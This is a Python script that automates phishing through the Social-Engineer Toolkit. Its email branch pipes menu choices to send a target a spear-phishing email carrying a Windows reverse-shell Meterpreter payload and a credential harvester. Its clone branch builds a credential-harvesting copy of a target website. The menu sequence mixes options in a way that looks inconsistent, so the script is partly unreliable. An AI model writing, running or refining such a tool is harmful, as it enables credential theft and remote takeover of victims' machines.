import subprocess

option = input("Do you want to phish using 1. email, 2. phone nr. or 3. clone page?: ")
if option == "1":
    targetmail = input("Mail of target?: ")
    mail = input("Your Gmail?: ")
    password = input("Gmail password?: ")
    filename = input("What should the file be called?: ")

    process = subprocess.Popen(['sudo', 'setoolkit'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    commands = [
        "1\n",  # Social-Engineering Attacks
        "1\n",  # Spear-Phishing Attack Vectors
        "1\n",  # Perform a Mass Email Attack
        "1\n",  # E-Mail Attack Single Email Address
        "16\n",  # Create a FileFormat Payload
        "\n",  # Use the file created
        "2\n",  # Social-Engineering Templates
        f"{filename}\n",  # Name of the file to save the email
        "1\n",  # Windows Reverse TCP Meterpreter
        "1\n",  # Use default Windows reverse TCP shellcode
        "3\n",  # Credential Harvester Attack Method
        f"{targetmail}\n",  # Target email address
        "1\n",  # Send Email to: Target email address
        f"{mail}\n",  # Sender email address
        f"{password}\n",  # Sender email password
        "yes\n"  # Confirm to send email
    ]

    for command in commands:
        process.stdin.write(command)
    process.stdin.close()
    process.wait()

elif option == "2":
    # Placeholder for phone number phishing
    pass

elif option == "3":
    url = input("Target URL?: ")

    process = subprocess.Popen(['sudo', 'setoolkit'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    commands = [
        "2\n",  # Website Attack Vectors
        "3\n",  # Credential Harvester Attack Method
        "2\n",  # Site Cloner
        f"{url}\n"  # URL to clone
    ]

    for command in commands:
        process.stdin.write(command)
    process.stdin.close()
    process.wait()

else:
    print("Invalid option. Exiting.")
    quit()
